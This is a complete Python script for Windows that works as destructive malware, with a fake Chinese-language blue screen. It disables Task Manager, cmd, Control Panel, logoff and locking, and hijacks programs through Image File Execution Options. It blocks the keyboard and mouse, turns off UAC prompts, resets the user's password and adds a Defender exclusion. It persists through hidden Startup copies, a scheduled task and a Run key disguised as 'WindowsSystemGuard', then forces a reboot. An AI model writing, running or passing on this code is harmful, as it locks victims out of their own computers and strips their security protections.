import os, sys, ctypes, time, subprocess, threading, shutil
import winreg
try:
  import psutil; import pynput
except:
  try: subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'psutil', 'pynput']); import psutil; import pynput
  except: pass
def run_cmd(c): subprocess.Popen(c, shell=True, creationflags=0x08000000)
def reg_mod(p, n, v, a):
  try:
    rm={'HKLM':winreg.HKEY_LOCAL_MACHINE,'HKCU':winreg.HKEY_CURRENT_USER}; rk=winreg.HKEY_CURRENT_USER; cp=p
    if chr(92) in p: px=p.split(chr(92))[0].upper(); rk=rm.get(px, rk); cp=chr(92).join(p.split(chr(92))[1:])
    k=winreg.CreateKeyEx(rk, cp, 0, winreg.KEY_SET_VALUE|winreg.KEY_WRITE)
    if a==1:
      if isinstance(v, str) and not v.isdigit(): winreg.SetValueEx(k, n, 0, winreg.REG_SZ, v)
      else: winreg.SetValueEx(k, n, 0, winreg.REG_DWORD, int(v))
    else: winreg.DeleteValue(k, n)
    winreg.CloseKey(k)
  except: pass
def set_ifeo(e, v): reg_mod('HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\'+e, 'Debugger', 'systray.exe', v)
ep = r'Software\Microsoft\Windows\CurrentVersion\Policies\Explorer'; sp = r'Software\Microsoft\Windows\CurrentVersion\Policies\System'
kbd_listener = None; mouse_listener = None
def lock_keyboard(block):
  global kbd_listener
  try:
    if block:
      if not kbd_listener: kbd_listener = pynput.keyboard.Listener(suppress=True); kbd_listener.start()
    else:
      if kbd_listener: kbd_listener.stop(); kbd_listener = None
  except: pass
def lock_mouse(block):
  global mouse_listener
  try:
    if block:
      if not mouse_listener: mouse_listener = pynput.mouse.Listener(suppress=True); mouse_listener.start()
    else:
      if mouse_listener: mouse_listener.stop(); mouse_listener = None
  except: pass
def show_bsod(color, stop, txt, code, act):
  import tkinter as tk
  w = tk.Tk(); w.attributes('-fullscreen', True, '-topmost', True); w.config(bg=color, cursor='none')
  tk.Label(w, text=':(', font=('Segoe UI', 100), bg=color, fg='white').pack(anchor='w', padx=100, pady=(100, 20))
  tk.Label(w, text=txt.replace('\\n', chr(10)), font=('Microsoft JhengHei', 24), bg=color, fg='white', justify='left').pack(anchor='w', padx=100)
  pv = tk.StringVar(value=chr(10)+'0% 完成'); tk.Label(w, textvariable=pv, font=('Microsoft JhengHei', 24), bg=color, fg='white', justify='left').pack(anchor='w', padx=100)
  tk.Label(w, text=chr(10)+f'中止代碼: {code}', font=('Microsoft JhengHei', 14), bg=color, fg='white', justify='left').pack(anchor='w', padx=100, pady=40)
  def update(p):
    if p <= stop: pv.set(chr(10)+f'{p}% 完成'); w.after(100, update, p + 1)
    else:
      if '關閉' in act: w.destroy()
  w.after(100, update, 0); w.mainloop()
reg_mod('HKCU\\'+ep, 'NoControlPanel', 1, 1); set_ifeo('SystemSettings.exe', 1)
time.sleep(0.01)
reg_mod('HKCU\\'+sp, 'DisableCMD', 1, 1); set_ifeo('cmd.exe', 1)
time.sleep(0.01)
reg_mod('HKCU\\'+ep, 'NoDesktop', 1, 1); run_cmd('taskkill /f /im explorer.exe & start explorer.exe')
time.sleep(0.01)
hwnd = ctypes.windll.user32.FindWindowW('Shell_TrayWnd', None); ctypes.windll.user32.ShowWindow(hwnd, 0 if 1 == 1 else 5) if hwnd else 0
time.sleep(0.01)
reg_mod('HKCU\\'+sp, 'DisableTaskMgr', 1, 1)
time.sleep(0.01)
reg_mod('HKCU\\'+ep, 'NoClose', 1, 1)
time.sleep(0.01)
reg_mod('HKCU\\'+ep, 'NoClose', 1, 1)
time.sleep(0.01)
reg_mod('HKCU\\'+sp, 'HideFastUserSwitching', 1, 1)
time.sleep(0.01)
reg_mod('HKCU\\'+ep, 'NoLogOff', 1, 1)
time.sleep(0.01)
reg_mod('HKCU\\'+sp, 'DisableLockWorkstation', 1, 1)
time.sleep(0.01)
reg_mod('HKCU\\'+ep, 'HideClock', 1, 1)
time.sleep(0.01)
reg_mod('HKCU\\'+ep, 'HideSCANetwork', 1, 1)
time.sleep(0.01)
run_cmd('taskkill /f /im ctfmon.exe' if 1==1 else 'start ctfmon.exe')
time.sleep(0.01)
lock_keyboard(True)
time.sleep(0.01)
lock_mouse(True)
time.sleep(0.01)
reg_mod(r'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\microphone', 'Value', 'Deny' if 1==1 else 'Allow', 1)
time.sleep(0.01)
reg_mod(r'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\webcam', 'Value', 'Deny' if 1==1 else 'Allow', 1)
time.sleep(0.01)
try:
  for _ in range(50): ctypes.windll.user32.keybd_event(0xAE, 0, 0, 0)
except: pass
time.sleep(0.01)
reg_mod(r'HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Serialize', 'StartupDelayInMS', 1000, 1)
time.sleep(0.01)
reg_mod(r'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System', 'ConsentPromptBehaviorAdmin', 0, 1); reg_mod(r'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System', 'PromptOnSecureDesktop', 0, 1)
time.sleep(0.01)
run_cmd('net stop w32time'); run_cmd("powershell -WindowStyle Hidden -Command \"Set-Date -Date '2026-01-01 00:00:00'\"")
time.sleep(0.01)
ctypes.windll.WINMM.mciSendStringW('set cdaudio door open', None, 0, None); run_cmd("powershell -WindowStyle Hidden -Command \"$s=New-Object -ComObject Shell.Application;$s.NameSpace(17).Items()|?{$_.Type -match '隨身碟|USB|Removable'}|%{$_.InvokeVerb('Eject')}\"")
time.sleep(0.01)
run_cmd('net accounts /minpwlen:0 & net user %USERNAME% 4096')
time.sleep(0.01)
sd = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
cf = os.path.abspath(sys.argv[0])
if not os.path.exists(sd): os.makedirs(sd)
run_cmd(f"powershell -WindowStyle Hidden -Command \"Add-MpPreference -ExclusionPath '{sd}'\"")
for i in range(5):
  tf = os.path.join(sd, f'sys_guard_{i}.pyw')
  if cf.lower() != tf.lower():
    try:
      if os.path.exists(tf): ctypes.windll.kernel32.SetFileAttributesW(tf, 128); os.remove(tf)
      shutil.copy2(cf, tf); ctypes.windll.kernel32.SetFileAttributesW(tf, 2)
    except: pass
if 5 > 0:
  ftf = os.path.join(sd, 'sys_guard_0.pyw')
  run_cmd('schtasks /create /tn "WindowsSystemGuard" /tr "\\"' + sys.executable + '\\" \\"' + ftf + '\\"" /sc onlogon /rl highest /f')
  reg_mod(r'HKCU\Software\Microsoft\Windows\CurrentVersion\Run', 'WindowsSystemGuard', '"' + sys.executable + '" "' + ftf + '"', 1)
time.sleep(0.01)
show_bsod('#0078D7', 100, '您的電腦發生問題，必須重新啟動。\n收集錯誤資訊中...', 'CRITICAL_PROCESS_DIED', '藍屏後關閉')
time.sleep(0.01)
run_cmd('shutdown /r /t 0')
time.sleep(0.01)
